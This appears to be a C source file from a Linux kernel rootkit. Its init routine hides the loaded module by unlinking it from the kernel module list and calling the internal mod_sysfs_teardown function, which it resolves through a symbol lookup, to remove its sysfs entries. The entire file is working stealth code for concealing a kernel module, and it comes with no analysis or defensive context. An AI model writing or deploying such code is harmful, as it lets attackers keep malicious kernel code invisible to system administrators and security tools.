#include <linux/list.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>

#include "module.h"

#include "../../sys/symbol.h"
#include "../../sys/file.h"
#include "../../sys/debug.h"

// module_init already exists in module.h
int module_init_(void)
{
	void(*mod_sysfs_teardown)(struct module*);

    list_del_rcu(&THIS_MODULE->list);

    mod_sysfs_teardown = (void(*)(struct module*))sym_lookup("mod_sysfs_teardown");
	mod_sysfs_teardown(THIS_MODULE);

    return 0;
}

int module_exit_(void)
{
    return 0;
}